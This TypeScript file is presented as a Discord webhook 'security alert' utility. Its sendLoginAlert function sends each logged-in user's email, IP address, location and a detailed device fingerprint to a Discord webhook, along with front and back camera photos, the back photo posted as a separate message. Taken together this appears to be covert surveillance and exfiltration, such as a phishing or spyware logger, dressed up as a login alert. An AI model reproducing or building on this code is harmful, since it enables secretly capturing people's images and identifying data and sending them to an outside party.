// Discord webhook utility

interface DiscordEmbed {
  title?: string;
  description?: string;
  color?: number;
  fields?: { name: string; value: string; inline?: boolean }[];
  thumbnail?: { url: string };
  image?: { url: string };
  footer?: { text: string };
  timestamp?: string;
}

interface DiscordMessage {
  content?: string;
  embeds?: DiscordEmbed[];
}

export async function sendToDiscord(
  webhookUrl: string,
  message: DiscordMessage
): Promise<boolean> {
  try {
    console.log("[Discord] Sending message:", JSON.stringify(message, null, 2));
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(message),
    });

    console.log("[Discord] Response status:", response.status);
    return response.ok;
  } catch (error) {
    console.error("[Discord] Failed to send:", error);
    return false;
  }
}

export async function sendLoginAlert(
  webhookUrl: string,
  data: {
    email: string;
    name?: string;
    ipAddress: string;
    location?: string;
    device: string;
    browser: string;
    os: string;
    screen: string;
    photoBase64?: string;
    backCameraPhoto?: string;
    timestamp: string;
    battery?: string;
    network?: string;
    cpuCores?: number | string;
    memory?: string;
    language?: string;
    timezone?: string;
    cookies?: string;
    doNotTrack?: string;
    gpu?: string;
  }
) {
  console.log("[Discord] Sending login alert to:", webhookUrl);

  const color = 0x00ff00; // Green

  // Build fields array - keep under Discord limits (25 fields max)
  const fields: { name: string; value: string; inline?: boolean }[] = [
    { name: "👤 Email", value: data.email, inline: true },
    { name: "📛 Name", value: data.name || "N/A", inline: true },
    { name: "⏰ Time", value: data.timestamp, inline: false },
    { name: "🌐 IP", value: data.ipAddress, inline: true },
    { name: "📍 Location", value: data.location || "Unknown", inline: true },
    { name: "📱 Device", value: data.device, inline: true },
    { name: "🌐 Browser", value: data.browser, inline: true },
    { name: "💻 OS", value: data.os, inline: true },
    { name: "🖥️ Screen", value: data.screen, inline: true },
    { name: "🔋 Battery", value: data.battery || "N/A", inline: true },
    { name: "📶 Network", value: data.network || "Unknown", inline: true },
    { name: "🧠 CPU", value: String(data.cpuCores || "N/A"), inline: true },
    { name: "💾 RAM", value: data.memory || "N/A", inline: true },
    { name: "🎮 GPU", value: data.gpu?.substring(0, 50) || "N/A", inline: false },
    { name: "🌍 Lang", value: data.language || "N/A", inline: true },
    { name: "🕐 TZ", value: data.timezone || "N/A", inline: true },
    { name: "🍪 Cookies", value: data.cookies || "Unknown", inline: true },
    { name: "🚫 DNT", value: data.doNotTrack || "Unknown", inline: true },
  ];

  const embed: DiscordEmbed = {
    title: "🔔 Login Detection",
    description: `New login from ${data.email}`,
    color,
    fields,
    footer: { text: "LiveChat Security Alert" },
    timestamp: new Date().toISOString(),
  };

  // Log embed for debugging
  console.log("[Discord] Embed fields count:", embed.fields?.length);

  // If we have photos, add them
  if (data.photoBase64 || data.backCameraPhoto) {
    embed.fields?.push({
      name: "📷 Cameras",
      value: data.photoBase64 && data.backCameraPhoto
        ? "Front + Back Camera"
        : data.backCameraPhoto
          ? "Back Camera Only"
          : "Front Camera Only",
      inline: false
    });

    if (data.photoBase64) {
      embed.image = { url: data.photoBase64 };
    }
  }

  // Send main message with embed - include embeds explicitly
  const finalMessage = {
    content: `🔐 **Login Alert** - ${data.email}`,
    embeds: [embed],
  };

  console.log("[Discord] Final message with embeds:", JSON.stringify(finalMessage, null, 2));

  await sendToDiscord(webhookUrl, finalMessage);

  // Send back camera photo as separate message if available
  if (data.backCameraPhoto) {
    const backCameraMessage: DiscordMessage = {
      content: `📷 **Back Camera** - ${data.email}`,
      embeds: [{
        image: { url: data.backCameraPhoto },
        color,
        footer: { text: "Back Camera Capture" },
        timestamp: new Date().toISOString(),
      }],
    };
    // Small delay between messages
    await new Promise(resolve => setTimeout(resolve, 500));
    await sendToDiscord(webhookUrl, backCameraMessage);
  }

  console.log("[Discord] Login alert completed");
  return true;
}
